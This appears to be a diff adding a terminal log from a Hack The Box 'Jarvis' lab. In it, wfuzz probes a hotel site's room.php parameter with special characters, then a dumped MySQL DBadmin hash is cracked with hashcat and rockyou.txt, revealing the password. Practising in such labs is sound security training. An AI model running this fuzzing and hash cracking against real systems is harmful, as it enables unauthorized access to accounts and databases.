@@ -1,0 +1,156 @@
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #wfuzz -u http://supersecurehotel.htb/room.php?cod=1FUZZ -w /opt/SecLists/Fuzzing/special-chars.txt                   
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.           
+
+********************************************************                          
+* Wfuzz 2.4 - The Web Fuzzer                           *                          
+********************************************************                          
+
+Target: http://supersecurehotel.htb/room.php?cod=1FUZZ                            
+Total requests: 32                       
+
+===================================================================               
+ID           Response   Lines    Word     Chars       Payload                                                                                                       
+===================================================================               
+
+000000003:   200        189 L    443 W    5916 Ch     "@"                                                                                                           
+000000001:   200        189 L    443 W    5916 Ch     "~"                                                                                                           
+000000002:   200        189 L    443 W    5916 Ch     "!"                                                                                                           
+000000005:   200        189 L    443 W    5916 Ch     "$"                                                                                                           
+000000007:   200        189 L    443 W    5916 Ch     "^"                                                                                                           
+000000004:   200        190 L    466 W    6204 Ch     "#"                                                                                                           
+000000008:   200        190 L    466 W    6204 Ch     "&"                                                                                                           
+000000006:   200        189 L    443 W    5916 Ch     "%"                                                                                                           
+000000010:   200        189 L    443 W    5916 Ch     "("                                                                                                           
+000000009:   200        189 L    443 W    5916 Ch     "*"                                                                                                           
+000000015:   200        189 L    443 W    5916 Ch     "="                                                                                                           
+000000016:   200        189 L    443 W    5916 Ch     "{"                                                                                                           
+000000017:   200        189 L    443 W    5916 Ch     "}"                                                                                                           
+000000018:   200        189 L    443 W    5916 Ch     "]"                                                                                                           
+000000019:   200        189 L    443 W    5916 Ch     "["                                                                                                           
+000000020:   200        189 L    443 W    5916 Ch     "|"                                                                                                           
+000000021:   200        189 L    443 W    5916 Ch     "\"                                                                                                           
+000000022:   200        189 L    443 W    5916 Ch     "`"                                                                                                           
+000000023:   200        189 L    443 W    5916 Ch     ","                                                                                                           
+000000024:   200        190 L    466 W    6204 Ch     "."                                                                                                           
+000000011:   404        1 L      11 W     54 Ch       ")"                                                                                                           
+000000025:   200        189 L    443 W    5916 Ch     "/"                                                                                                           
+000000026:   200        189 L    443 W    5916 Ch     "?"                                                                                                           
+000000012:   404        1 L      11 W     54 Ch       "_"                                                                                                           
+000000013:   404        1 L      11 W     54 Ch       "_"                                                                                                           
+000000014:   404        1 L      11 W     54 Ch       "+"                                                                                                           
+000000027:   200        190 L    466 W    6204 Ch     ";"                                                                                                           
+000000028:   200        189 L    443 W    5916 Ch     ":"                                                                                                           
+000000029:   200        189 L    443 W    5916 Ch     "'"                                                                                                           
+000000030:   200        189 L    443 W    5916 Ch     """                                                                                                           
+000000031:   404        1 L      11 W     54 Ch       "<"                                                                                                           
+000000032:   200        189 L    443 W    5916 Ch     ">"                                                                                                           
+
+Total time: 2.162650                     
+Processed Requests: 32                   
+Filtered Requests: 0                     
+Requests/sec.: 14.79665                  
+
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #echo -n DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 > mysql-cred      
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #cat mysql-    
+cat: mysql-: No such file or directory   
+┌─[✗]─[root@parrot]─[~/hackthebox/jarvis]
+└──╼ #cat mysql-cred                     
+DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0┌─[root@parrot]─[~/hackthebox/jarvis]                
+└──╼ #vi mysql_hashes                    
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #hashcat --example-hashes | grep -i mysql -B1 -A2                            
+MODE: 200           
+TYPE: MySQL323      
+HASH: 7196759210defdc0                   
+PASS: hashcat       
+--                  
+MODE: 300           
+TYPE: MySQL4.1/MySQL5                    
+HASH: fcf7c1b8749cf99d88e5f34271d636178fb5d130                                    
+PASS: hashcat       
+--                  
+MODE: 11200         
+TYPE: MySQL CRAM (SHA1)                  
+HASH: $mysqlna$2576670568531371763643101056213751754328*5e4be686a3149a12847caa9898247dcc05739601      
+PASS: hashcat       
+
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #echo -n fcf7c1b8749cf99d88e5f34271d636178fb5d130 | wc -c                    
+40                  
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #wc -c mysql_hashes                 
+41 mysql_hashes     
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #hashcat -m 300 mysql_hashes /opt/wordlists/rockyou.txt                      
+hashcat (v5.1.0) starting...             
+
+* Device #1: Not a native Intel OpenCL runtime. Expect massive speed loss.        
+             You can use --force to override, but do not report related errors.   
+No devices found/left.                   
+
+Started: Tue Jan  7 18:08:58 2020        
+Stopped: Tue Jan  7 18:08:59 2020        
+┌─[✗]─[root@parrot]─[~/hackthebox/jarvis]
+└──╼ #hashcat -m 300 mysql_hashes /opt/wordlists/rockyou.txt --force              
+hashcat (v5.1.0) starting...             
+
+OpenCL Platform #1: The pocl project     
+====================================     
+* Device #1: pthread-Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz, 512/1493 MB allocatable, 2MCU         
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts                               
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates      
+Rules: 1            
+
+Applicable optimizers:                   
+* Zero-Byte         
+* Early-Skip        
+* Not-Salted        
+* Not-Iterated      
+* Single-Hash       
+* Single-Salt       
+
+Minimum password length supported by kernel: 0                                    
+Maximum password length supported by kernel: 256                                  
+
+ATTENTION! Pure (unoptimized) OpenCL kernels selected.                            
+This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.                
+If you want to switch to optimized OpenCL kernels, append -O to your commandline. 
+
+Watchdog: Hardware monitoring interface not found on your system.                 
+Watchdog: Temperature abort trigger disabled.                                     
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=3 -D DGST_R1=4 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=5 -D KERN_TYPE=300 -D _unroll'                 
+* Device #1: Kernel m00300_a0-pure.ff499af0.kernel not found in cache! Building may take a while...   
+Dictionary cache hit:                    
+* Filename..: /opt/wordlists/rockyou.txt 
+* Passwords.: 14344384                   
+* Bytes.....: 139921497                  
+* Keyspace..: 14344384                   
+
+2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou                                 
+                                                                                  
+Session..........: hashcat               
+Status...........: Cracked               
+Hash.Type........: MySQL4.1/MySQL5       
+Hash.Target......: 2d2b7a5e4e637b8fba1d17f40318f277d29964d0                       
+Time.Started.....: Tue Jan  7 18:10:11 2020 (1 sec)                               
+Time.Estimated...: Tue Jan  7 18:10:12 2020 (0 secs)                              
+Guess.Base.......: File (/opt/wordlists/rockyou.txt)                              
+Guess.Queue......: 1/1 (100.00%)         
+Speed.#1.........:     3019 H/s (8.95ms) @ Accel:1024 Loops:1 Thr:1 Vec:8         
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts                     
+Progress.........: 2048/14344384 (0.01%) 
+Rejected.........: 0/2048 (0.00%)        
+Restore.Point....: 0/14344384 (0.00%)    
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1                             
+Candidates.#1....: 123456 -> lovers1     
+
+Started: Tue Jan  7 18:09:04 2020        
+Stopped: Tue Jan  7 18:10:14 2020        
+┌─[root@parrot]─[~/hackthebox/jarvis]    
+└──╼ #              
